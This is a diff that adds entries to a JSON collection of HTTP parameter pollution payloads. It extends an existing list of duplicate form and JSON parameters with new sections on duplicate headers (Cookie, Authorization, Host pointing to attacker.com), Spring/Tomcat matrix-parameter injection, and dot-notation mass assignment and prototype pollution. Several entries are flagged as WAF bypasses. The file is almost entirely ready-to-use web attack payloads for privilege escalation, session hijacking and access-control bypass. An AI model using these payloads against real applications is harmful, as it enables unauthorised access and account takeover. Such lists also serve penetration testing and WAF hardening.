@@ -15,7 +15,7 @@
       "payloads": [
         {"payload": "amount=100&amount=0.01", "description": "Amount parameter pollution - backend may use first, WAF/validator last", "waf_bypass": false},
         {"payload": "to=victim@example.com&to=attacker@example.com", "description": "Email destination pollution for CC injection", "waf_bypass": false},
-        {"payload": "status=pending&status=approved", "description": "Status field pollution for workflow bypass", "waf_bypass": false }
+        {"payload": "status=pending&status=approved", "description": "Status field pollution for workflow bypass", "waf_bypass": false}
       ]
     },
     "mixed": {
@@ -41,6 +41,34 @@
         {"payload": "{\"role\":\"user\",\"role\":\"admin\"}", "description": "Duplicate JSON key - behavior depends on parser (last-wins vs first-wins)", "waf_bypass": false},
         {"payload": "{\"amount\":\"1000000\",\"amount\":\"1\"}", "description": "Duplicate amount key in JSON body", "waf_bypass": false},
         {"payload": "{\"admin\":false,\"admin\":true}", "description": "Duplicate admin boolean key", "waf_bypass": false}
+      ]
+    },
+    "header": {
+      "description": "HTTP header parameter pollution — duplicate or conflicting headers",
+      "payloads": [
+        {"payload": "Cookie: session=legitimate\r\nCookie: session=attacker_session", "description": "Duplicate Cookie headers — server may concatenate or use last value", "waf_bypass": false},
+        {"payload": "Authorization: Bearer legitimate_token\r\nAuthorization: Bearer attacker_token", "description": "Duplicate Authorization headers — proxy may forward one, app reads another", "waf_bypass": false},
+        {"payload": "Content-Type: application/json\r\nContent-Type: application/x-www-form-urlencoded", "description": "Duplicate Content-Type — WAF parses as JSON, app parses as form data", "waf_bypass": true},
+        {"payload": "Host: legitimate.com\r\nHost: attacker.com", "description": "Duplicate Host header — cache poisoning and routing confusion", "waf_bypass": false},
+        {"payload": "X-Forwarded-For: 10.0.0.1\r\nX-Forwarded-For: 127.0.0.1", "description": "Duplicate X-Forwarded-For — app may use first or last depending on implementation", "waf_bypass": false}
+      ]
+    },
+    "matrix_params": {
+      "description": "Path matrix parameter injection (Tomcat/Spring) — semicolon-delimited params in URL path",
+      "payloads": [
+        {"payload": "/api/users;role=admin/profile", "description": "Matrix param injection — Spring may bind 'role' from path segment to controller param", "waf_bypass": true},
+        {"payload": "/api/v1;version=2/endpoint", "description": "Version override via matrix param — bypass API versioning controls", "waf_bypass": true},
+        {"payload": "/admin;bypass=true/dashboard", "description": "Matrix param to inject arbitrary params into path-based routing", "waf_bypass": true},
+        {"payload": "/api/users;id=ADMIN_ID/settings", "description": "User ID injection via matrix param — IDOR through path parameter pollution", "waf_bypass": true}
+      ]
+    },
+    "dot_notation": {
+      "description": "Dot-notation object injection in frameworks that auto-bind nested properties",
+      "payloads": [
+        {"payload": "user.role=admin", "description": "Mass assignment via dot notation — override user role property (Spring, .NET)", "waf_bypass": false},
+        {"payload": "config.debug=true", "description": "Enable debug mode via dot-notation config injection", "waf_bypass": false},
+        {"payload": "__proto__.admin=true", "description": "Prototype pollution via dot notation — inject admin property on Object prototype (Node.js)", "waf_bypass": false},
+        {"payload": "constructor.prototype.isAdmin=true", "description": "Alternative prototype pollution via constructor chain (Node.js/Express)", "waf_bypass": false}
       ]
     }
   }
